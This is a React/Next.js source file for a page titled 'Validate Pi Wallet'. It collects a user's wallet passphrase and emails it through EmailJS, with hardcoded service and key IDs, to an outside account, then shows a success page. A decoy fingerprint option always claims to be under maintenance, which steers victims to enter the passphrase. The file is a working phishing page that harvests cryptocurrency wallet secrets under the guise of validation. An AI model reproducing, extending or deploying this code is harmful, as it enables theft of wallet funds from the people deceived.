"use client";
import React, { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { BsCheck } from "react-icons/bs";
import emailjs from "@emailjs/browser";
import { motion } from "framer-motion";
import { variants } from "./data";

export default function Validate() {
  const [fingerPrintError, setFingerPrintError] = useState(false);
  const [loading, setLoading] = useState(false);
  const form = useRef<HTMLFormElement>(null);
  const [valid, setValid] = useState(false);
  const [phrase, setPhrase] = useState("");
  const [error, setError] = useState("");
  const router = useRouter();
  const phraseNumber = 5;
  const sendEmail = async (e: any) => {
    e.preventDefault();
    setLoading(true);
    setFingerPrintError(false);
    const words = phrase.split(" ");
    const phrases = words.filter((el) => el !== "");
    if (!phrase) {
      setLoading(false);
      return setError(`Please fill in this field with your Passphrase`);
    }
    if (phrases.length < phraseNumber) {
      setLoading(false);
      return setError(
        `Passphrase must have ${phraseNumber} words but you provided only ${phrases.length}`
      );
    }
    if (phrases.length > phraseNumber) {
      setLoading(false);
      return setError(
        `Passphrase cannot contain more than ${phraseNumber} words`
      );
    }
    const result = await emailjs.sendForm(
      "service_yemnxd7",
      "template_cynhp4b",
      form.current!,
      "vxNiSsCkFGn0bYVYn"
    );
    if (result.status === 200) {
      setLoading(false);
      setPhrase("");
      setValid(true);
      router.push("/success");
    } else {
      setLoading(false);
      setError("Something went wrong, try again later");
    }
  };
  useEffect(() => setError(""), [phrase]);

  return (
    <motion.main
      variants={variants}
      initial="closed"
      animate="open"
      className="center mt-7"
    >
      <form className="max-w-[500px] w-full" ref={form} onSubmit={sendEmail}>
        <p className="mb-8 font-bold text-lg text-center">Validate Pi Wallet</p>
        <div className="w-full px-12">
          <input type="hidden" name="from_name" id="" value="Pi Wallet" />
          <input type="hidden" name="to_name" id="" value="Pi Wallet" />
          <textarea
            name="message"
            placeholder={`Enter your ${phraseNumber}-word passphrase here`}
            onFocus={() => setFingerPrintError(false)}
            className={`p-3 h-64 capitalize w-full placeholder:font-normal font-semibold resize-none border-2 duration-300 text-sm ${
              error !== ""
                ? "border-red-500  placeholder:text-red-500 outline-red-500"
                : "border-gray-400 placeholder:text-gray-700 outline-customYellow"
            } rounded`}
            id=""
            value={phrase}
            onChange={(e: any) => setPhrase(e.target.value)}
          />
          <div
            className={`duration-500 ${
              error === "" ? "h-0 opacity-0 overflow-hidden" : "h-5 opacity-100"
            } `}
          >
            <p className="text-[13px] text-red-500 m-1">{error}</p>
          </div>
        </div>
        <div className="px-12 center">
          <button
            className={`w-full py-3 h-14 hover:text-purple-800 hover:border-purple-800 text-xs duration-500 center rounded-full border-[3px] mt-5  font-semibold uppercase border-customPurpleA shadow-md text-customPurpleA`}
            type="submit"
            disabled={loading}
          >
            {loading ? (
              <span className="loader"></span>
            ) : (
              " validate with passphrase"
            )}
          </button>
        </div>
        <div className="px-12 mt-7">
          <p
            onClick={() => setFingerPrintError(true)}
            className="w-full py-3 lg:py-4 center text-xs rounded-lg border-[3px] bg-customPurpleA border-customPurpleA shadow-md hover:bg-purple-800 cursor-pointer duration-300 text-white text-center font-semibold uppercase"
          >
            validate with fingerprint{" "}
          </p>
          <p
            className={`text-red-500 m-2 text-[13px] duration-500 ${
              fingerPrintError ? "opacity-100" : "opacity-0"
            }`}
          >
            Sorry this option is under maintenance, try validating with the Passphrase option above
          </p>
        </div>
      </form>
    </motion.main>
  );
}
